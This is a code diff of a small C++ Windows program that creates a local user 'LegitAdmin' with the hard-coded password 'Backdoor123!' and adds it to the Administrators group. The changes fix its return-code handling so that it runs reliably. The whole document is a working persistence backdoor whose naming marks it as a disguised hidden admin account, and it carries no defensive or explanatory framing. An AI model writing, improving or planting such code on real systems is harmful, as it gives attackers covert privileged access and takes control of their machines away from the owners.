@@ -8,7 +8,8 @@ wstring name = L"LegitAdmin";
 LPWSTR lpName = const_cast<wchar_t*>(name.c_str());
 wstring password = L"Backdoor123!";
 LPWSTR lpPassword = const_cast<wchar_t*>(password.c_str());
-DWORD adduserStatus = 0;
+DWORD adduserStatus;
+DWORD errorInStruct;
 wstring adminGroup = L"Administrators";
 
 int main()
@@ -24,7 +25,7 @@ int main()
     userinfo.usri1_script_path = NULL;
     _LOCALGROUP_MEMBERS_INFO_3 localgroupinfo;
     localgroupinfo.lgrmi3_domainandname = lpName;
-    NetUserAdd(NULL, 1, (LPBYTE)&userinfo, &adduserStatus);
+    adduserStatus = NetUserAdd(NULL, 1, (LPBYTE)&userinfo, &errorInStruct);
     if (!adduserStatus)
     {
         cout << "User LegitAdmin with Password Backdoor123 successfully added \n";
@@ -34,8 +35,10 @@ int main()
     {
         cout << "something went wrong... error code ";
         cout << adduserStatus;
+        return -1;
     }
-    NetLocalGroupAddMembers(NULL, adminGroup.c_str(),3,(LPBYTE)&localgroupinfo,1);
+    
+    adduserStatus = NetLocalGroupAddMembers(NULL, adminGroup.c_str(),3,(LPBYTE)&localgroupinfo,1);
     if (!adduserStatus)
     {
         cout << "User added to admin group! \n";
@@ -44,5 +47,8 @@ int main()
     {
         cout << "something went wrong... error code ";
         cout << adduserStatus;
+        cout << "error in struct code: " << errorInStruct;
+        return -1;
     }
+    
 }
